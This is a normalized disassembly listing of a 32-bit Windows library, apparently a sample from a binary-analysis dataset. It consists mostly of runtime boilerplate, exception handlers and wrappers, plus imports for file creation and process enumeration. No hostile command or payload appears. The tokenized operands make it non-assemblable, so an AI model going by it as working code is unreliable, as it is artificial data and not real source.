mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_100332f0
call eax
retn
sub_100332f3
push 0x2
call sub_10023708
pop ecx
retn
sub_100333a7
mov eax rw-data
retn
sub_100333ad
mov eax rw-data
retn
sub_100333b3
mov eax rw-data
retn
sub_100333b9
mov eax rw-data
retn
sub_100333bf
mov edi edi
push ebp
mov ebp esp
call sub_100333a7
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_100333d0
mov edi edi
push ebp
mov ebp esp
call sub_100333ad
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_100333e1
mov edi edi
push ebp
mov ebp esp
call sub_100333b3
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_1003369e
push 0x7
call sub_10028e74
pop ecx
retn
sub_1003377e
push 0x6
call sub_10028e74
pop ecx
retn
sub_100338e7
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_10035d5d
add esp 0xc
pop ebp
retn
sub_10035d88
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileA@IAT ]
mov [ rw-data ] eax
retn
sub_10037243
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10037155
add esp 0x10
pop ebp
retn
sub_10037321
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_10037c38
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10037b7c
add esp 0xc
pop ebp
retn
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
Process32FirstW
jmp [ Process32FirstW@IAT ]
Process32NextW
jmp [ Process32NextW@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_100381e4
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
add ecx 0x58
push ecx
mov ecx [ ebp + 0x8 ]
call sub_10001daa
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1003a3bb
mov edi edi
push ebp
mov ebp esp
call sub_10046dae
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
pop ebp
retn 0x4
sub_1003a3d3
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
call sub_1002eb16
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
leave
retn 0x4
sub_1003a4f8
mov [ ecx ] r--data
retn
sub_1003a542
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
call sub_100209c6
push [ esi + 0xc ]
call sub_100209c6
pop ecx
pop ecx
pop esi
retn
sub_1003a581
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
call sub_100209c6
push [ esi + 0x10 ]
call sub_100209c6
push [ esi + 0x14 ]
call sub_100209c6
add esp 0xc
pop esi
retn
sub_1003a8cd
xor al al
retn
sub_1003a8d0
push 0x5
pop eax
retn
sub_1003a8f7
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi ] r--data
je r-xdata
mov [ esi ] r--data
pop esi
retn
push [ esi + 0x10 ]
call sub_100207fd
pop ecx
sub_1003a93a
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001b22d
add esp 0x10
pop ebp
retn 0xc
sub_1003a9b6
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x8 ]
call sub_1001bb27
pop ecx
pop ecx
pop ebp
retn 0x4
sub_1003a9fd
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x8 ]
call sub_1001baba
pop ecx
pop ecx
pop ebp
retn 0x4
sub_1003aa7a
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1003aa44
sub_1003ab2e
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1003aae6
sub_1003abeb
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
mov [ esi ] r--data
call sub_100207fd
pop ecx
mov [ esi ] r--data
pop esi
retn
sub_1003acb2
mov edi edi
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003a5a3
mov [ esi ] r--data
pop esi
retn
sub_1003acca
mov ax [ ecx + 0xe ]
retn
sub_1003accf
mov edi edi
push ebp
mov ebp esp
mov ecx [ ecx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_1003ad03
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000253e
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_1003ad21
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10006e41
add esp 0xc
pop ebp
retn
sub_1003ada5
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003ad03
add esp 0x10
pop ebp
retn
sub_1003ade3
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10001dd0
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_1003ae78
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003ade3
add esp 0x10
pop ebp
retn
sub_1003affb
or eax 0xffffffff
retn 0x8
sub_1003b179
mov edi edi
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003a5a3
mov [ esi ] r--data
pop esi
retn
sub_1003b191
mov eax [ ecx + 0x1c ]
retn
sub_1003b195
mov edi edi
push ebp
mov ebp esp
mov ecx [ ecx + 0x24 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_1003b1cd
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
mov [ esi ] r--data
call sub_100207fd
pop ecx
mov [ esi ] r--data
pop esi
retn
sub_1003b470
mov ecx [ ebp - 0x14 ]
call sub_1003a581
xor ebx ebx
push ebx
push ebx
call sub_10023a01
int3
sub_1003b6c8
mov ecx [ ebp - 0x14 ]
call sub_1003a5a3
push 0x0
push 0x0
call sub_10023a01
int3
sub_1003b9e6
mov ecx [ ebp - 0x14 ]
call sub_1003a5a3
push 0x0
push 0x0
call sub_10023a01
int3
sub_1003ba6b
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
mov esi ecx
push [ ebp + 0x8 ]
call sub_1003af0f
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003ba85
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_1003ad63
pop ecx
pop ecx
pop ebp
retn 0x4
sub_1003bb4d
mov edi edi
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003a581
mov [ esi ] r--data
pop esi
retn
sub_1003be4e
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov [ ebp + 0x8 ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1003ba85
mov [ ebp - 0x14 ] eax
mov eax r-xdata
retn
sub_1003bebf
mov ecx [ ebp - 0x18 ]
xor esi esi
push esi
push 0x1
call sub_1003bd13
push esi
push esi
call sub_10023a01
int3
sub_1003c036
push 0x0
push 0x1
call sub_1003bd13
retn
sub_1003c0be
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1003cd38
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_100020c6
mov eax [ ebp + 0x8 ]
leave
retn 0x14
sub_1003cf31
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_100012f3
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1003cf4d
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_100012f3
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1003cf69
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_100012f3
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1003d205
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1003c8f7
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1003d221
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1003c8f7
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1003d421
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1003c948
mov eax [ ebp + 0x8 ]
leave
retn 0x14
sub_1003d61a
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1003c8f7
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1003f31f
mov ecx [ ebp - 0x14 ]
call sub_1003a542
xor ebx ebx
push ebx
push ebx
call sub_10023a01
int3
sub_10041046
mov ecx [ ebp - 0x14 ]
call sub_1003a542
xor ebx ebx
push ebx
push ebx
call sub_10023a01
int3
sub_1004147b
mov edi edi
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003a542
mov [ esi ] r--data
pop esi
retn
sub_10042ea8
mov edi edi
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003a542
mov [ esi ] r--data
pop esi
retn
sub_100441e8
retn 0x4
sub_10044231
mov edi edi
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003a5a3
mov [ esi ] r--data
pop esi
retn
sub_10044249
mov al [ ecx + 0xd ]
retn
sub_10044274
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
mov [ esi ] r--data
call sub_100207fd
pop ecx
mov [ esi ] r--data
pop esi
retn
sub_10044474
mov ecx [ ebp - 0x14 ]
call sub_1003a5a3
push 0x0
push 0x0
call sub_10023a01
int3
sub_1004458c
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100445a5
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001daa
mov eax [ ebp + 0x8 ]
leave
retn 0x14
sub_10044a6d
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x8 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001d1f
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10044a89
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001d1f
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10044aa5
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001d1f
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10044ac1
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001d1f
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10045e0e
mov ecx [ ebp - 0x14 ]
call sub_1003a542
xor ebx ebx
push ebx
push ebx
call sub_10023a01
int3
sub_10046197
mov eax [ ecx + 0x10 ]
retn
sub_1004619b
mov edi edi
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003a542
mov [ esi ] r--data
pop esi
retn
sub_10046dae
mov edi edi
push esi
call sub_100264e1
mov esi [ eax + 0x4 ]
call sub_100264bb
mov edx eax
mov eax esi
pop esi
retn
sub_100470e0
lea ecx [ ebp - 0x10 ]
jmp sub_1001b1e7
sub_100470e8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047103
mov ecx [ ebp - 0x10 ]
jmp sub_1003a4f8
sub_1004710b
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_10001da0
sub_10047116
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047131
lea ecx [ ebp - 0x10 ]
jmp sub_1001b1e7
sub_10047139
push [ ebp - 0x14 ]
call sub_1002004f
pop ecx
retn
sub_10047143
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047160
mov ecx [ ebp - 0x10 ]
jmp sub_100025e2
sub_10047168
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_100025e2
sub_10047173
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047190
mov ecx [ ebp - 0x10 ]
jmp sub_100025e2
sub_10047198
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_100025e2
sub_100471a3
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100471c0
mov ecx [ ebp - 0x10 ]
jmp sub_10001cc8
sub_100471c8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100471f0
lea ecx [ ebp - 0x28 ]
jmp sub_100025e2
sub_100471f8
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp sub_100025e2
sub_10047211
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x24 ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047230
lea ecx [ ebp - 0x30 ]
jmp sub_10001da0
sub_10047238
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047260
lea ecx [ ebp - 0x27c ]
jmp sub_100025e2
sub_1004726b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x288 ]
mov ecx [ edx - 0x28c ]
xor ecx eax
call sub_10020040
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100472a0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100472c0
mov ecx [ ebp - 0x10 ]
jmp sub_100025e2
sub_100472c8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100472f0
mov eax [ ebp - 0x18 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x18 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
jmp sub_10001da0
sub_10047309
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x20 ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047330
lea ecx [ ebp - 0x4c ]
jmp sub_10001da0
sub_10047338
lea ecx [ ebp - 0x30 ]
jmp sub_10001da0
sub_10047340
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047360
mov ecx [ ebp - 0x14 ]
jmp sub_1001c4f0
sub_10047368
mov ecx [ ebp - 0x14 ]
add ecx 0x4c
jmp sub_1001c3f0
sub_10047373
mov eax [ ebp + 0x8 ]
push eax
call sub_1002004f
pop ecx
retn
sub_1004737e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100473a0
mov ecx [ ebp - 0x10 ]
jmp sub_10001cc8
sub_100473a8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100473d0
lea ecx [ ebp - 0x2c ]
jmp sub_100025e2
sub_100473d8
lea ecx [ ebp - 0xb8 ]
jmp sub_10001da0
sub_100473e3
lea ecx [ ebp - 0x9c ]
jmp sub_100025e2
sub_100473ee
lea ecx [ ebp - 0xb8 ]
jmp sub_100025e2
sub_100473f9
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xd4 ]
mov ecx [ edx - 0xd8 ]
xor ecx eax
call sub_10020040
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047430
lea ecx [ ebp - 0xd4 ]
jmp sub_10001da0
sub_1004743b
lea ecx [ ebp - 0x2c ]
jmp sub_100025e2
sub_10047443
lea ecx [ ebp - 0xd4 ]
jmp sub_100025e2
sub_1004744e
lea ecx [ ebp - 0xd4 ]
jmp sub_10001da0
sub_10047459
lea ecx [ ebp - 0xb8 ]
jmp sub_100025e2
sub_10047464
lea ecx [ ebp - 0x9c ]
jmp sub_100025e2
sub_1004746f
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xec ]
mov ecx [ edx - 0xf0 ]
xor ecx eax
call sub_10020040
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100474a0
mov ecx [ ebp - 0x10 ]
jmp sub_1003a4f8
sub_100474a8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100474d0
mov ecx [ ebp - 0x10 ]
jmp sub_1003a4f8
sub_100474d8
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_10001da0
sub_100474e3
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047500
mov eax [ ebp - 0xa0 ]
push eax
call sub_1002004f
pop ecx
retn
sub_1004750e
mov eax [ ebp - 0xa4 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0xa4 ] 0xfffffffe
lea ecx [ ebp - 0x9c ]
jmp sub_10001da0
sub_10047530
mov eax [ ebp - 0xa4 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0xa4 ] 0xfffffffd
lea ecx [ ebp - 0x80 ]
jmp sub_10007701
sub_1004754f
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xa4 ]
mov ecx [ edx - 0xa8 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047570
mov eax [ ebp - 0x10 ]
push eax
call sub_1002004f
pop ecx
retn
sub_1004757b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100475a0
lea ecx [ ebp - 0x1c ]
jmp sub_1001b1e7
sub_100475a8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x24 ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100475d0
mov ecx [ ebp - 0x54 ]
jmp sub_1001b1e7
sub_100475d8
mov ecx [ ebp - 0x54 ]
add ecx 0x4
jmp sub_10001da0
sub_100475e3
mov ecx [ ebp - 0x54 ]
add ecx 0x20
jmp sub_10001da0
sub_100475ee
mov ecx [ ebp - 0x54 ]
add ecx 0x3c
jmp sub_10001da0
sub_100475f9
mov ecx [ ebp - 0x54 ]
add ecx 0x58
jmp sub_10001da0
sub_10047604
lea ecx [ ebp - 0x50 ]
jmp sub_10001da0
sub_1004760c
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x50 ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047630
mov ecx [ ebp - 0x88 ]
jmp sub_1003a4f8
sub_1004763b
lea ecx [ ebp - 0x84 ]
jmp sub_10007701
sub_10047646
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x80 ]
mov ecx [ edx - 0x84 ]
xor ecx eax
call sub_10020040
add eax 0x4
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047680
lea ecx [ ebp - 0x14 ]
jmp sub_10007b41
sub_10047688
mov eax [ ebp - 0x10 ]
push eax
call sub_1002004f
pop ecx
retn
sub_10047693
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x18 ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100476b0
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_100476be
mov edx [ esp + 0x8 ]
lea eax [ edx ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100476e0
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_100476ee
mov edx [ esp + 0x8 ]
lea eax [ edx ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047710
mov ecx [ ebp - 0x2c ]
jmp sub_100025e2
sub_10047718
lea ecx [ ebp - 0x28 ]
jmp sub_100025e2
sub_10047720
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x28 ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047740
mov ecx [ ebp - 0x30 ]
jmp sub_100025e2
sub_10047748
lea ecx [ ebp - 0x2c ]
jmp sub_100025e2
sub_10047750
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x28 ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10020040
add eax 0x4
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047780
mov eax [ ebp - 0x48 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x48 ] 0xfffffffe
lea ecx [ ebp - 0x28 ]
jmp sub_100025e2
sub_10047799
mov eax [ ebp - 0x48 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x48 ] 0xfffffffd
lea ecx [ ebp - 0x44 ]
jmp sub_100025e2
sub_100477b2
mov eax [ ebp - 0x48 ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x48 ] 0xfffffffb
mov ecx [ ebp + 0x4 ]
jmp sub_100025e2
sub_100477cb
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4c ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100477f0
lea ecx [ ebp - 0x28 ]
jmp sub_10001da0
sub_100477f8
mov ecx [ ebp - 0x2c ]
jmp sub_10001cc8
sub_10047800
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2c ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047820
lea ecx [ ebp - 0x114 ]
jmp sub_1001c460
sub_1004782b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x120 ]
mov ecx [ edx - 0x124 ]
xor ecx eax
call sub_10020040
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047860
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_1004786e
mov edx [ esp + 0x8 ]
lea eax [ edx ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047890
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
jmp sub_10001da0
sub_100478a9
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100478d0
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_100478de
mov edx [ esp + 0x8 ]
lea eax [ edx ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047900
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_1004790e
mov edx [ esp + 0x8 ]
lea eax [ edx ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047930
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_1004793e
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
lea ecx [ ebp - 0x28 ]
jmp sub_10001da0
sub_10047957
mov eax [ ebp - 0x2c ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffd
mov ecx [ ebp + 0x4 ]
jmp sub_10001da0
sub_10047970
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x28 ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047990
lea ecx [ ebp - 0x30 ]
jmp sub_1001f510
sub_10047998
mov eax [ ebp - 0x38 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x38 ] 0xfffffffe
mov ecx [ ebp - 0x34 ]
jmp sub_10001da0
sub_100479b1
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_100479b9
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x40 ]
mov ecx [ edx - 0x44 ]
xor ecx eax
call sub_10020040
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100479e1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_100479fc
lea ecx [ ebp - 0x10 ]
jmp sub_1001b1e7
sub_10047a04
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047a1f
push [ ebp + 0x8 ]
call sub_1002004f
pop ecx
retn
sub_10047a29
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10047a42
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047a60
push [ ebp + 0x10 ]
call sub_1002004f
pop ecx
retn
sub_10047a6a
lea ecx [ ebp - 0x2c ]
jmp sub_10001da0
sub_10047a72
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
sub_10047a8d
lea ecx [ ebp - 0x84 ]
jmp sub_10007701
sub_10047a98
lea ecx [ ebp - 0x88 ]
jmp sub_1001b1e7
sub_10047aa3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x98 ]
xor ecx eax
call sub_10020040
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10020040
mov eax r--data
jmp sub_10023ada
